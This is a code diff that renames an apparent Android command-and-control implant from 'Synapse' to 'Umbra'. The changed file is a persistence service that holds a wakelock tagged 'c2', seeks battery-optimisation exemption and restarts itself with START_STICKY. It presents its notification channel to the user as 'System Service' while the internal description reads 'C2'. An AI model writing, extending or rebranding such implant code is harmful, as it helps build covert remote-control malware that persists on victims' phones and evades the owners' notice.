@@ -1,4 +1,4 @@
-package org.synapse.core.persistence
+package org.umbra.core.persistence
 
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -14,16 +14,16 @@ import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import org.synapse.core.MainActivity
-import org.synapse.core.core.SynapseEngine
+import org.umbra.core.MainActivity
+import org.umbra.core.core.UmbraEngine
 
-class SynapseService : Service() {
+class UmbraService : Service() {
 
     companion object {
-        private const val TAG = "Synapse"
+        private const val TAG = "Umbra"
         private const val NOTIFICATION_ID = 1001
-        private const val CHANNEL_ID = "synapse_service"
-        private const val WAKELOCK_TAG = "synapse:c2"
+        private const val CHANNEL_ID = "umbra_service"
+        private const val WAKELOCK_TAG = "umbra:c2"
     }
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -64,7 +64,7 @@ class SynapseService : Service() {
         requestBatteryExemption()
 
         // ── Launch engine if not already running ──
-        SynapseEngine.start(this)
+        UmbraEngine.start(this)
 
         Log.d(TAG, "Foreground service started — launching engine")
         return START_STICKY
@@ -152,7 +152,7 @@ class SynapseService : Service() {
                 "System Service",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Synapse C2"
+                description = "Umbra C2"
                 setShowBadge(false)
             }
             val manager = getSystemService(NotificationManager::class.java)
